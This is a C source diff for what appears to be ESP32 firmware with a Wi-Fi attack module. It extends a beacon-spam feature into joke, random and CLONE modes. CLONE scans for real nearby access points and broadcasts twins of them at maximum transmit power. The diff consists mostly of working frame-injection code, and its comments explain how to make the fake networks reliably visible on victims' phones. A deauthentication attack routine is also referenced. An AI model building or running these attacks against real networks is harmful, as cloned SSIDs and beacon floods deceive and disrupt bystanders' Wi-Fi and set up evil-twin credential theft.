@@ -531,8 +531,9 @@ esp_err_t nucleo_wifiatk_deauth_start(int target_idx)
     s_start_us = esp_timer_get_time();
 
     // We OWN the radio here (raw injection) — exclusive never touches Wi-Fi (no NX_WIFI), so we still
-    // suspend STA auto-reconnect ourselves. NX_NET_APP also frees voice + ANIMA L1 (~31KB) the old
-    // manual teardown left resident; restored by nucleo_exclusive_exit() on every exit path below.
+    // suspend STA auto-reconnect ourselves. NX_NET_APP also frees voice + ANIMA L1 (~24KB) the old
+    // manual teardown left resident; restored by nucleo_exclusive_exit() on every exit path below. The
+    // WIFI_PS_NONE set just below is restored to MIN_MODEM by nucleo_setup_apply_network() on exit.
     nucleo_setup_suspend();                               // no real-MAC re-association to home mid-attack
     nucleo_exclusive_enter(NX_NET_APP, NULL);             // stop httpd + mDNS + voice + L1
     esp_wifi_set_mode(WIFI_MODE_STA);
@@ -613,23 +614,54 @@ unsigned      nucleo_wifiatk_uptime_s(void)
 
 // ---- beacon spam ------------------------------------------------------------
 // Flood the air with fake beacon frames so a wall of bogus SSIDs appears in everyone's Wi-Fi list
-// (the classic Bruce/Marauder "Beacon Spam"). Each fake AP gets a stable, locally-administered
-// random BSSID (so it reads as a persistent network, not noise) and we cycle the common 2.4 GHz
-// channels. Same raw-TX path + sanity-check override the deauth uses, injected on the STA iface
-// under promiscuous mode (no real AP of ours is exposed). AUTHORIZED testing only.
-static const char *BEACON_SSIDS[] = {
+// (the classic Bruce/Marauder "Beacon Spam") — but engineered NOT to be missed. Three modes:
+//   FUNNY  : a curated wall of plausible/joke SSIDs (mixed open + WPA2 so a few show a lock)
+//   RANDOM : a session of randomly generated, real-looking SSIDs (e.g. "iPhone di Luca 3F")
+//   CLONE  : twins of the real APs around you (runs a passive scan first; strongest realism)
+//
+// Why it beats a blind sprayer (the "I can't see them on my phone" fixes):
+//   * STABLE BSSID per fake AP (assigned once) -> reads as a persistent network, not flapping noise.
+//     Bruce/Marauder regenerate the MAC every frame, so each beacon looks like a brand-new AP.
+//   * DWELL + REPEAT: we sit on a channel and re-beacon the WHOLE set several times before hopping.
+//     A real AP beacons ~10x/s on ONE channel; a phone's scan dwells ~100ms/channel, so the classic
+//     "blast once then hop" is exactly why beacons get missed. We saturate the channel instead.
+//   * STANDARDS-COMPLETE frame: SSID + supported rates + DS param + ERP IE (+ RSN IE on the WPA2
+//     ones). The ERP element is what strict 11g scanners want; without it some stacks drop the beacon.
+//   * 100 TU interval + 1 Mbps long-preamble + chip-max TX power (set in beacon_start) = robust reach.
+// Same raw-TX path + sanity-check override the deauth uses, injected on the STA iface under
+// promiscuous mode (no real AP of ours is exposed). AUTHORIZED testing only.
+static const char *FUNNY_SSIDS[] = {
     "Free Public WiFi", "Aeroporto Free WiFi", "Hotel Guest", "Starbucks WiFi", "McDonald's Free WiFi",
     "FRITZ!Box Gast", "TIM-Guest", "Vodafone Hotspot", "FASTWEB-FREE", "WINDTRE-WiFi",
     "Comune WiFi Free", "Biblioteca WiFi", "Treno WiFi", "Autogrill Free WiFi", "Bar WiFi",
     "FBI Surveillance Van", "Pretty Fly for a WiFi", "Tell My WiFi Love Her", "Loading...", "Mom Click Here",
     "Hidden Network", "The Promised LAN", "Martin Router King", "Abraham Linksys", "Get Off My LAN",
 };
-#define N_BEACON ((int)(sizeof(BEACON_SSIDS)/sizeof(BEACON_SSIDS[0])))
+#define N_FUNNY ((int)(sizeof(FUNNY_SSIDS)/sizeof(FUNNY_SSIDS[0])))
+
+// Word pools for RANDOM mode — combined into believable home/phone/router SSIDs.
+static const char *RND_PREFIX[] = {
+    "AndroidAP", "iPhone di", "Galaxy", "Casa", "WiFi", "Rete", "FRITZ!Box", "TP-LINK", "HUAWEI",
+    "Vodafone", "TIM", "Fastweb", "Linksys", "NETGEAR", "DIRECT", "Redmi", "Office", "Studio",
+};
+static const char *RND_SUFFIX[] = {
+    "Luca", "Marco", "Guest", "5G", "Home", "Pro", "Plus", "Net", "HD", "X", "2024", "Free", "Lab",
+};
+
+#define MAX_BEACON          64   // hard cap on fake APs in flight (heap-backed, freed on stop)
+#define BEACON_REPEAT        2   // frames per SSID per pass (Bruce sends 2; redundancy vs RX loss)
+#define BEACON_DWELL_ROUNDS  4   // re-beacon the whole set N times per channel before hopping
 
 static TaskHandle_t    s_bcn_task;
 static volatile unsigned long s_bcn_frames;
-static uint8_t         s_bcn_bssid[N_BEACON][6];
 static int64_t         s_bcn_start_us;
+static int             s_bcn_mode;
+// Heap-backed tables (allocated on start, freed on stop) — kept OUT of resident .bss per the
+// boot-RAM discipline. ~2.5 KB total, trivially available once NX_NET_APP has freed httpd/L1.
+static char    (*s_bcn_ssid)[33];
+static uint8_t (*s_bcn_bssid)[6];
+static bool     *s_bcn_wpa;
+static volatile int s_bcn_n;
 
 // A locally-administered, unicast random MAC (set bit1, clear the multicast bit0 of the first octet).
 static void rand_laa_mac(uint8_t out[6])
@@ -640,9 +672,56 @@ static void rand_laa_mac(uint8_t out[6])
     out[4] = (uint8_t)b;        out[5] = (uint8_t)(b >> 8);
 }
 
-static void beacon_tx(const char *ssid, const uint8_t *bssid, uint8_t ch)
+static void gen_random_name(char *out, size_t cap)
 {
-    uint8_t f[128]; int n = 0;
+    uint32_t a = esp_random(), b = esp_random();
+    const char *p = RND_PREFIX[a % (sizeof RND_PREFIX / sizeof RND_PREFIX[0])];
+    const char *s = RND_SUFFIX[(a >> 8) % (sizeof RND_SUFFIX / sizeof RND_SUFFIX[0])];
+    snprintf(out, cap, "%s %s %02X", p, s, (unsigned)(b & 0xFF));
+}
+
+// Fill the fake-AP table for the chosen mode. Returns the count. Must run with Wi-Fi started
+// (CLONE performs a passive scan). Stable BSSID + per-entry security are assigned here, once.
+static int beacon_populate(int mode)
+{
+    int n = 0;
+    if (mode == NUCLEO_BEACON_CLONE) {
+        nucleo_wifiatk_scan();                       // passive recon of the real APs nearby
+        for (int i = 0; i < s_ntargets && n < MAX_BEACON; i++) {
+            if (!s_targets[i].ssid[0]) continue;     // skip cloaked APs (no SSID to clone)
+            snprintf(s_bcn_ssid[n], 33, "%s", s_targets[i].ssid);
+            rand_laa_mac(s_bcn_bssid[n]);            // our own BSSID -> a twin alongside the real AP
+            s_bcn_wpa[n] = (s_targets[i].auth != WIFI_AUTH_OPEN);
+            n++;
+        }
+        // Pad a thin neighbourhood up to a respectable wall so the app always does something visible.
+        for (int i = 0; i < N_FUNNY && n < 24 && n < MAX_BEACON; i++) {
+            snprintf(s_bcn_ssid[n], 33, "%s", FUNNY_SSIDS[i]);
+            rand_laa_mac(s_bcn_bssid[n]); s_bcn_wpa[n] = (i % 5 == 0); n++;
+        }
+        return n;
+    }
+    if (mode == NUCLEO_BEACON_RANDOM) {
+        for (; n < 40 && n < MAX_BEACON; n++) {
+            gen_random_name(s_bcn_ssid[n], 33);
+            rand_laa_mac(s_bcn_bssid[n]);
+            s_bcn_wpa[n] = (esp_random() & 1);       // ~half WPA2, half open — looks like a real area
+        }
+        return n;
+    }
+    for (; n < N_FUNNY && n < MAX_BEACON; n++) {      // FUNNY (default / fallback)
+        snprintf(s_bcn_ssid[n], 33, "%s", FUNNY_SSIDS[n]);
+        rand_laa_mac(s_bcn_bssid[n]);
+        s_bcn_wpa[n] = (n % 5 == 0);                 // a few WPA2 ones for a credible lock icon
+    }
+    return n;
+}
+
+// Build + transmit one beacon. wpa=true adds an RSN IE (WPA2-PSK-CCMP) and sets the Privacy bit, so
+// the AP shows a lock; wpa=false advertises an open network.
+static void beacon_tx(const char *ssid, const uint8_t *bssid, uint8_t ch, bool wpa)
+{
+    uint8_t f[160]; int n = 0;
     f[n++] = 0x80; f[n++] = 0x00;                 // frame control: beacon (mgmt subtype 8)
     f[n++] = 0x00; f[n++] = 0x00;                 // duration
     memset(f + n, 0xFF, 6); n += 6;               // DA = broadcast
@@ -650,13 +729,21 @@ static void beacon_tx(const char *ssid, const uint8_t *bssid, uint8_t ch)
     memcpy(f + n, bssid, 6); n += 6;              // BSSID
     f[n++] = 0x00; f[n++] = 0x00;                 // seq/frag (driver rewrites seq)
     memset(f + n, 0, 8); n += 8;                  // timestamp
-    f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval = 100 TU
-    f[n++] = 0x01; f[n++] = 0x04;                 // capability: ESS, short slot (open network)
+    f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval = 100 TU (~10 beacons/s)
+    f[n++] = wpa ? 0x11 : 0x01; f[n++] = 0x04;    // capability: ESS + short slot (+ Privacy if WPA2)
     int sl = (int)strlen(ssid); if (sl > 32) sl = 32;
     f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;          // SSID IE
     f[n++] = 0x01; f[n++] = 0x08;                 // supported rates IE
     f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96; f[n++] = 0x24; f[n++] = 0x30; f[n++] = 0x48; f[n++] = 0x6C;
     f[n++] = 0x03; f[n++] = 0x01; f[n++] = ch;    // DS parameter set IE (current channel)
+    f[n++] = 0x2A; f[n++] = 0x01; f[n++] = 0x00;  // ERP IE — strict 11g scanners drop beacons without it
+    if (wpa) {                                    // RSN IE: WPA2-PSK CCMP (group CCMP, 1 pairwise CCMP, 1 AKM PSK)
+        static const uint8_t rsn[] = {
+            0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC,
+            0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00,
+        };
+        memcpy(f + n, rsn, sizeof rsn); n += (int)sizeof rsn;
+    }
     s_tx_try++;
     bool ok = (esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK);
     if (ok) s_bcn_frames++;
@@ -671,22 +758,47 @@ static void beacon_task(void *arg)
     while (s_bcn_run) {
         uint8_t ch = CHANS[ci++ % 3];
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        vTaskDelay(pdMS_TO_TICKS(5));
-        for (int i = 0; i < N_BEACON && s_bcn_run; i++) beacon_tx(BEACON_SSIDS[i], s_bcn_bssid[i], ch);
-        vTaskDelay(1);                            // yield to the radio driver / WDT
+        vTaskDelay(pdMS_TO_TICKS(5));             // settle on the channel
+        // Verify the driver actually landed on this channel; re-assert if not (injecting on the wrong
+        // channel is the classic "fires but nothing shows up"). Same guard the deauth flood uses.
+        uint8_t pch = 0; wifi_second_chan_t sch;
+        if (esp_wifi_get_channel(&pch, &sch) == ESP_OK && pch != ch)
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        // DWELL: re-beacon the whole set several times before hopping, so a phone scanning THIS
+        // channel right now actually catches us (vs blast-once-then-hop, which it usually misses).
+        for (int r = 0; r < BEACON_DWELL_ROUNDS && s_bcn_run; r++) {
+            for (int i = 0; i < s_bcn_n && s_bcn_run; i++)
+                for (int k = 0; k < BEACON_REPEAT; k++)
+                    beacon_tx(s_bcn_ssid[i], s_bcn_bssid[i], ch, s_bcn_wpa[i]);
+            vTaskDelay(1);                        // yield to the radio driver / WDT each round
+        }
     }
     s_bcn_task = NULL;
     vTaskDelete(NULL);
 }
 
-esp_err_t nucleo_wifiatk_beacon_start(void)
+static void beacon_free_tables(void)
+{
+    free(s_bcn_ssid);  s_bcn_ssid  = NULL;
+    free(s_bcn_bssid); s_bcn_bssid = NULL;
+    free(s_bcn_wpa);   s_bcn_wpa   = NULL;
+}
+
+esp_err_t nucleo_wifiatk_beacon_start(int mode)
 {
     if (s_bcn_run) return ESP_OK;
     if (s_run)     return ESP_ERR_INVALID_STATE;  // the deauth flood already owns the radio
+    if (mode < NUCLEO_BEACON_FUNNY || mode > NUCLEO_BEACON_CLONE) mode = NUCLEO_BEACON_FUNNY;
+
+    s_bcn_ssid  = malloc(sizeof(*s_bcn_ssid)  * MAX_BEACON);
+    s_bcn_bssid = malloc(sizeof(*s_bcn_bssid) * MAX_BEACON);
+    s_bcn_wpa   = malloc(sizeof(*s_bcn_wpa)   * MAX_BEACON);
+    if (!s_bcn_ssid || !s_bcn_bssid || !s_bcn_wpa) { beacon_free_tables(); return ESP_ERR_NO_MEM; }
+
     s_bcn_frames = 0;
     s_tx_try = 0; s_tx_fail = 0; s_pace_us = 0; s_ok_run = 0;
     s_bcn_start_us = esp_timer_get_time();
-    for (int i = 0; i < N_BEACON; i++) rand_laa_mac(s_bcn_bssid[i]);
+    s_bcn_mode = mode;
 
     nucleo_setup_suspend();                         // no real-MAC re-association to home mid-attack
     nucleo_exclusive_enter(NX_NET_APP, NULL);       // stop httpd + mDNS + voice + L1 (we own the radio; no NX_WIFI)
@@ -695,8 +807,22 @@ esp_err_t nucleo_wifiatk_beacon_start(void)
     esp_wifi_set_ps(WIFI_PS_NONE);
     rf_boost();                                                      // chip-max power + ext antenna if wired
     esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);   // robust long-range beacons
+
+    // Build the fake-AP table now that Wi-Fi is up (CLONE scans here). scan() flips to APSTA, so
+    // force STA back before we go promiscuous to inject.
+    s_bcn_n = beacon_populate(mode);
+    if (s_bcn_n <= 0) s_bcn_n = beacon_populate(NUCLEO_BEACON_FUNNY);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+
+    // CRITICAL for visibility: in Solo the device is still ASSOCIATED to the home AP (Wi-Fi stays up
+    // for cloud), which PINS the radio to that AP's channel. Our 1/6/11 channel-hop then gets dragged
+    // back, so beacons leak on one channel only and a phone scanning the band misses them. Drop the
+    // association (auto-reconnect already suspended above) so esp_wifi_set_channel actually sticks.
+    esp_wifi_disconnect();
+
     esp_err_t pe = esp_wifi_set_promiscuous(true);  // free channel control + raw inject
     if (pe != ESP_OK) {
+        beacon_free_tables();
         nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
         return pe;
     }
@@ -704,10 +830,11 @@ esp_err_t nucleo_wifiatk_beacon_start(void)
     if (xTaskCreate(beacon_task, "wa_beacon", 4096, NULL, 5, &s_bcn_task) != pdPASS) {
         s_bcn_run = false;
         esp_wifi_set_promiscuous(false);
+        beacon_free_tables();
         nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
         return ESP_FAIL;
     }
-    ESP_LOGW(TAG, "Beacon spam ARMED: %d fake SSIDs", N_BEACON);
+    ESP_LOGW(TAG, "Beacon spam ARMED: mode %d, %d fake SSIDs", mode, s_bcn_n);
     return ESP_OK;
 }
 
@@ -719,12 +846,21 @@ void nucleo_wifiatk_beacon_stop(void)
     esp_wifi_set_promiscuous(false);
     nucleo_setup_apply_network();        // network up first
     nucleo_exclusive_exit();             // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
+    beacon_free_tables();                // task is gone (waited above) -> safe to free the tables
     ESP_LOGI(TAG, "Beacon spam disarmed; network + OS web UI restored");
 }
 
 bool          nucleo_wifiatk_beacon_running(void) { return s_bcn_run; }
 unsigned long nucleo_wifiatk_beacon_frames(void)  { return s_bcn_frames; }
-int           nucleo_wifiatk_beacon_count(void)   { return N_BEACON; }
+int           nucleo_wifiatk_beacon_count(void)   { return s_bcn_n; }
+int           nucleo_wifiatk_beacon_mode(void)    { return s_bcn_mode; }
+// % of beacon TX attempts the driver accepted (shares the AIMD counters). Low = the chip is dropping
+// frames under the flood — the honest "it fires but nothing shows up" signal, surfaced in the UI.
+int           nucleo_wifiatk_beacon_health(void)
+{
+    unsigned long t = s_tx_try;
+    return t ? (int)((s_tx_try - s_tx_fail) * 100 / t) : 100;
+}
 unsigned      nucleo_wifiatk_beacon_uptime_s(void)
 {
     return s_bcn_run ? (unsigned)((esp_timer_get_time() - s_bcn_start_us) / 1000000) : 0;
